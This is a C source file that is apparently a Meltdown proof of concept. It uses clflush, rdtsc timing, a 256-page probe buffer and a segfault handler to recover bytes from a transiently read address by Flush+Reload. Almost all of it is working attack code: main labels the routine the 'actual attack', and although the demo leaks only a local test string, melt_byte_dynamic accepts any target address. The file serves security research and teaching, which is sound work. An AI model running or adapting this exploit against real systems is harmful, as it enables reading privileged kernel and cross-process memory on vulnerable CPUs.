#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <setjmp.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>

#define KB 1024
#define ROUNDS 100
#define REPEAT 4
#define STATIC_EARLY_EXIT 10
#define PROBE_PAGES 256
#define PROBE_SIZE (KB * 4 * PROBE_PAGES)

// ----- Global vars
static jmp_buf longjmp_buf;
char *probe_buffer;

typedef enum
{
	ERROR,
	INFO,
	SUCCESS
} d_sym_t;

static void _log(d_sym_t symbol, const char *fmt, ...)
{
	switch (symbol)
	{
	case ERROR:
		printf("\x1b[31;1m[-]\x1b[0m ");
		break;
	case INFO:
		printf("\x1b[33;1m[.]\x1b[0m ");
		break;
	case SUCCESS:
		printf("\x1b[32;1m[+]\x1b[0m ");
		break;
	default:
		break;
	}
	va_list ap;
	va_start(ap, fmt);
	vfprintf(stdout, fmt, ap);
	va_end(ap);
}

void flush(const uint64_t *adrs)
{
	asm __volatile__("mfence\nclflush 0(%0)"
									 :
									 : "r"(adrs)
									 :);
}

int time_access_no_flush(const uint64_t *adrs)
{
	volatile unsigned long time;
	asm __volatile__(
			"  mfence             \n"
			"  lfence             \n"
			"  rdtsc              \n"
			"  lfence             \n"
			"  movl %%eax, %%esi  \n"
			"  movl (%1), %%eax   \n"
			"  lfence             \n"
			"  rdtsc              \n"
			"  subl %%esi, %%eax  \n"
			: "=a"(time)
			: "c"(adrs)
			: "%esi", "%edx");
	return time;
}


void flush_probe_buffer()
{
	for (int i = 0; i < PROBE_SIZE; i++)
	{
		flush(&probe_buffer[i]);
	}
}

void load_probe_buffer()
{
	for (int i = 0; i < PROBE_PAGES; i++)
	{
		char tmp = probe_buffer[4 * KB * i];
	}
}

void populate_probe_buffer()
{
	for (int i = 0; i < PROBE_SIZE; i++)
	{
		probe_buffer[i] = (unsigned char)(rand() % 256);
	}
}

void unblock_signal(int signum __attribute__((__unused__)))
{
	sigset_t sigs;
	sigemptyset(&sigs);
	sigaddset(&sigs, signum);
	sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

void segfault_handler_callback(int signum)
{
	(void)signum;
	unblock_signal(SIGSEGV);
	longjmp(longjmp_buf, 1);
}

void setup_signal_handler()
{
	signal(SIGSEGV, segfault_handler_callback);
}

char __attribute__((optimize("-O0"))) melt_byte_dynamic(size_t _target_addr)
{
	int rounds = ROUNDS;
	volatile char *legal = malloc(sizeof(char));
	int access_times_mins[256];
	for (int i = 0; i < 256; i++)
	{
		access_times_mins[i] = 1000000;
	}

	while (rounds--)
	{
		if (!setjmp(longjmp_buf))
		{
			// fill the pipeline. Increases accuracy
			*(legal);
			*(legal);
			*(legal);
			*(legal);

			// Assembly version
			// asm volatile("1:\n"
			// 						 "movzx (%%rcx), %%rax\n"
			// 						 "shl $12, %%rax\n"
			// 						 "jz 1b\n"
			// 						 "movq (%%rbx,%%rax,1), %%rbx\n" ::"c"(_target_addr),
			// 						 "b"(probe_buffer)
			// 						 : "rax");

			// C Version
			char temp = probe_buffer[(*(volatile char *)_target_addr) *4 * KB];
		}

		for (int i = 0; i < 256; i++)
		{
			int access_time = time_access_no_flush(&probe_buffer[i * 4 * KB]);
			if (access_time < access_times_mins[i] && access_time > 0)
			{
				access_times_mins[i] = access_time;
			}
			flush(&probe_buffer[i * 4 * KB]);
		}
	}

	int min_val = 10000;
	int min_idx = 0;
	for (int i = 1; i < 256; i++)
	{
		if (access_times_mins[i] < min_val)
		{
			min_val = access_times_mins[i];
			min_idx = i;
		}
	}

	return (char)min_idx;
}

int main(int argc, char *argv[])
{	
	// Just used for Proof of concept testing. 
	// Assume this memory is stored somewhere in kernel memory.
	const char *test = "TestStringLeakedByMeltdown";
	
	// ----- actual attack
	probe_buffer = malloc(PROBE_SIZE);
	setup_signal_handler();
	populate_probe_buffer();
	flush_probe_buffer();

	_log(SUCCESS, "Decoded secred=");
	for (int i = 0; i < strlen(test); i++)
	{
		char byte = melt_byte_dynamic(test + i);
		printf("%c", byte);
	}
	printf("\n");

	return 0;
}
